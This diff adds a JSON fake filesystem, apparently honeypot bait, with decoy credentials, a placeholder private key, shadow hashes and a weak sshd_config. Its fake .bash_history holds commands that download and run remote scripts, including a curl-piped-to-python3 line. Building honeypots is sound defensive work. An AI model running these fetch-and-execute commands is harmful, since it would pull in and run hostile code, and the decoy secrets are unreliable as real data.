@@ -1,0 +1,54 @@
+{
+  "/": {
+    "type": "directory",
+    "contents": ["root", "home", "etc", "var", "usr", "tmp"]
+  },
+  "/root": {
+    "type": "directory",
+    "contents": ["Documents", "Downloads", "passwords.txt", ".bash_history", ".ssh"]
+  },
+  "/root/Documents": {
+    "type": "directory",
+    "contents": ["notes.txt", "todo.md"]
+  },
+  "/root/.ssh": {
+    "type": "directory",
+    "contents": ["id_rsa", "authorized_keys"]
+  },
+  "/etc": {
+    "type": "directory",
+    "contents": ["passwd", "shadow", "hosts", "ssh", "nginx"]
+  },
+  "/etc/ssh": {
+    "type": "directory",
+    "contents": ["sshd_config"]
+  },
+  "/var": {
+    "type": "directory",
+    "contents": ["www", "log"]
+  },
+  "/var/www": {
+    "type": "directory",
+    "contents": ["html", "config.php", "database.sql"]
+  },
+  "/home": {
+    "type": "directory",
+    "contents": ["admin", "user"]
+  },
+  "/tmp": {
+    "type": "directory",
+    "contents": []
+  },
+  "files": {
+    "passwords.txt": "admin:P@ssw0rd123\nroot:SuperSecret99\ndbuser:mysql_2024\napplication_key:a8f5f167f44f4964e6c998dee827110c",
+    ".bash_history": "mysql -u root -p\nwget http://malware.example.com/bot.sh\nchmod +x bot.sh\n./bot.sh\nrm bot.sh\ncurl http://192.168.1.100/payload.py | python3",
+    "config.php": "<?php\n$db_host = '127.0.0.1';\n$db_user = 'admin';\n$db_pass = 'dbP@ss2024';\n$db_name = 'production';\n?>",
+    "database.sql": "-- Database dump\nCREATE DATABASE users;\nUSE users;\nINSERT INTO admins VALUES ('admin', 'password123');",
+    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin User:/home/admin:/bin/bash\nnginx:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+    "/etc/shadow": "root:$6$rounds=656000$YT89...:18924:0:99999:7:::\nadmin:$6$rounds=656000$XT12...:18924:0:99999:7:::",
+    "/etc/hosts": "127.0.0.1 localhost\n192.168.1.1 gateway\n10.0.0.5 database-server",
+    "sshd_config": "Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\n# Weak configuration for honeypot",
+    "notes.txt": "TODO:\n- Patch OpenSSH vulnerability\n- Update database credentials\n- Review firewall rules",
+    "id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA... [FAKE KEY]\n-----END RSA PRIVATE KEY-----"
+  }
+}
